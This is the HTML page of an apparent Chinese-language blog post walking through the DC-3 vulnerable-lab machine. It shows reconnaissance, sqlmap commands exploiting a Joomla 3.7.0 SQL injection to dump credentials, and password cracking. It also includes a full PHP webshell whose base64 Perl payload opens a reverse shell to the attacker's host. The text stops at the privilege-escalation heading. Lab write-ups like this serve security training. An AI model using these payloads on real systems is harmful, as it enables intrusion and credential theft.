@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="渗透靶机DC-3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透DC-3">
+<meta property="og:url" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/index.html">
+<meta property="og:site_name" content="zzZxby&#39;s blog">
+<meta property="og:description" content="渗透靶机DC-3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122092824391.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122092922438.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093027990.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093348733.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093433746.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093536768.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093650322.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122094008700.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122094149617.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122094743514.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122095510384.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122095706137.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122100019842.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122100308057.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122100816181.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122101752737.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102059990.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102137214.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102533844.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102831603.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102934553.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122103224211.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122103414506.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104844657.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122103648175.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104349675.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104544906.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104712166.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104750143.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122105111460.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122105248656.png">
+<meta property="og:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122105300018.png">
+<meta property="article:published_time" content="2023-11-22T13:06:13.000Z">
+<meta property="article:modified_time" content="2023-11-22T13:16:19.328Z">
+<meta property="article:author" content="zzZxby">
+<meta property="article:tag" content="保持学习的热情">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122092824391.png">
+
+<link rel="canonical" href="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>渗透DC-3 | zzZxby's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+
+
+
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zzZxby's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/22/%E6%B8%97%E9%80%8FDC-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zzZ.jpg">
+      <meta itemprop="name" content="zzZxby">
+      <meta itemprop="description" content="看山是山，看水是水">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzZxby's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透DC-3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-22 21:06:13 / 修改时间：21:16:19" itemprop="dateCreated datePublished" datetime="2023-11-22T21:06:13+08:00">2023-11-22</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+            <div class="post-description">渗透靶机DC-3</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="靶机描述">靶机描述</h1>
+<p>下载地址：http://www.five86.com/downloads/DC-3-2.zip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</span><br><span class="line"></span><br><span class="line">For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).</span><br><span class="line"></span><br><span class="line">If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</span><br></pre></td></tr></table></figure>
+<h1 id="信息收集">信息收集</h1>
+<p>扫描同网段存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122092824391.png"></p>
+<p>扫描端口号，发现开放80端口，web应用服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 172.18.1.137</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122092922438.png"></p>
+<p>尝试访问web页面，看到靶机提示，此靶机只存在一个flag，而且目标是获取管理员权限</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093027990.png"></p>
+<p>此网页目前信息有限，尝试后台扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.18.1.137/ -e * -i 200</span><br><span class="line"></span><br><span class="line">-e 文件类型</span><br><span class="line">-i 状态码</span><br><span class="line">只显示该状态码</span><br><span class="line">-x 状态码</span><br><span class="line">不显示该状态码</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093348733.png"></p>
+<p>后台存在管理员登录界面</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093433746.png"></p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093536768.png"></p>
+<p>在readme文件中也能看到对应的cms版本</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122093650322.png"></p>
+<h1 id="漏洞发现">漏洞发现</h1>
+<p>使用joomscan对网站进行探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan是一款开源的且针对joomla的扫描器</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 172.18.1.137</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122094008700.png"></p>
+<p>针对cms的对应版本去寻找已知漏洞，使用工具searchsploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit是一款kali自带的搜索漏洞信息的模块</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure>
+<p>发现该版本的cms，存在一个sql注入漏洞</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122094149617.png"></p>
+<p>漏洞介绍存在的详细目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
+<p>给了漏洞存在地址，以及漏洞利用方式</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122094743514.png"></p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<h2 id="sql注入">sql注入</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://172.18.1.137/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbs --batch</span><br><span class="line"></span><br><span class="line"># --batch是让sqlmap自动选择执行过程中出现的询问请求</span><br><span class="line"># --dbs 列出所有数据库的名字</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122095510384.png"></p>
+<p>然后看一下joomladb这个数据库的表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://172.18.1.137/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb --batch --tables</span><br><span class="line"></span><br><span class="line"># -D指定数据库</span><br><span class="line"># --tables查看表名</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122095706137.png"></p>
+<p>查看表中的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://172.18.1.137/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T '#__users' --columns</span><br><span class="line"></span><br><span class="line"># 表名含有特殊符号，需要用引号包括</span><br><span class="line"># 这里就不能用--batch参数了，会默认使用公共参数爆破给N掉，导致注入失败，手动输入y和回车就好</span><br><span class="line"># --columns 查看列名</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122100019842.png"></p>
+<p>知道字段名后，就可以查看用户和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://172.18.1.137/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T '#__users' -C username,password --dump</span><br><span class="line"></span><br><span class="line"># -C指定列名</span><br><span class="line"># --dump列出字段名称</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122100308057.png"></p>
+<p>密码被hash处理过，需要碰撞一下</p>
+<h2 id="密码破解">密码破解</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用John工具，对该密码进行爆破拆解</span><br><span class="line">先在桌面创建一个文件，将上面的hash密码复制进去并保存，接着使用john指向该文件</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122100816181.png"></p>
+<p>这个密码就是登录后台的密码，账号是admin</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122101752737.png"></p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>在后台找到一个文件上传点</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102059990.png"></p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102137214.png"></p>
+<p>通过php写一个反弹shell的命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>{</span><br><span class="line">	<span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">"which <span class="subst">$pr</span>"</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">	}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>{</span><br><span class="line">	<span class="variable">$res</span> = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$cfe</span>) {</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">'exec'</span>)) {</span><br><span class="line">			@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line">			<span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">"\n"</span>,<span class="variable">$res</span>);</span><br><span class="line">			} </span><br><span class="line">			<span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">'shell_exec'</span>)) {</span><br><span class="line">			<span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">			} <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">'system'</span>)) {</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">} <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">'passthru'</span>)) {</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">} <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">"r"</span>))) {</span><br><span class="line"><span class="variable">$res</span> = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) {</span><br><span class="line"><span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">}</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>{</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">'w'</span>)) {</span><br><span class="line">@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">"your IP"</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">'your port'</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>.</span><br><span class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>.</span><br><span class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>.</span><br><span class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>.</span><br><span class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>.</span><br><span class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>.</span><br><span class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">'/tmp/.bc'</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102533844.png"></p>
+<p>对应的ip就是攻击机的ip，端口号需要开一个</p>
+<p>joomla的特性，模块会单独放在一个文件夹里/templates/，而beez3模块就在/templates/beez3/里面，刚才创建的webshell路径为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.1.137/templates/beez3/webshell.php</span><br></pre></td></tr></table></figure>
+<p>现在kali上开一个监听端口，然后在web上访问该文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102831603.png"></p>
+<p>利用python升级成交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122102934553.png"></p>
+<h1 id="提权">提权</h1>
